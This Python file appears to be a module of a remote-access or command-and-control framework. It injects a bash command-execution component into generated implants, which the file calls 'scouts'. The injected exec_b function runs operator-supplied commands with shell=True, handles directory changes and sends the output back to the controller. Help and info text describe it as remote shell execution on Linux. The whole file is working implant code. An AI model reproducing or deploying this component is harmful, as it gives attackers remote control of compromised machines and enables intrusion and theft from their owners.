# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('from subprocess import Popen, PIPE')
        config.import_statements.append('from os import chdir')
        config.functions.append('''
def exec_b(execute):
    execute = execute.split(' ',1)[1]
    if execute[:3] == 'cd ':
        execute = execute.replace('cd ', '', 1)
        chdir(execute)
        main_send("[+]Changed to directory : " + execute, s)
    else:
        result = Popen(execute, executable='/bin/bash', shell=True, stdout=PIPE, stderr=PIPE,
                       stdin=PIPE)
        result = result.stdout.read() + result.stderr.read()
        main_send('[+]Command output : \\n' + result.decode(), s)''')
        config.logics.append('''
            elif command == "exec_b":
                exec_b(data)''')
        config.help_menu[
            'exec_b <shell command>'] = 'A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash shell'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Execute command bash component",
                "OS": "Linux",
                "Required Modules": "subprocess",
                "Commands": "exec_b <shell command>",
                "Description": "A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash"
            }
        elif interface == "CUI":
            print('\nName             : Execute command bash component' \
                  '\nOS               : Linux' \
                  '\nRequired Modules : subprocess' \
                  '\nCommands         : exec_b <shell command>' \
                  '\nDescription      : A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash\n')
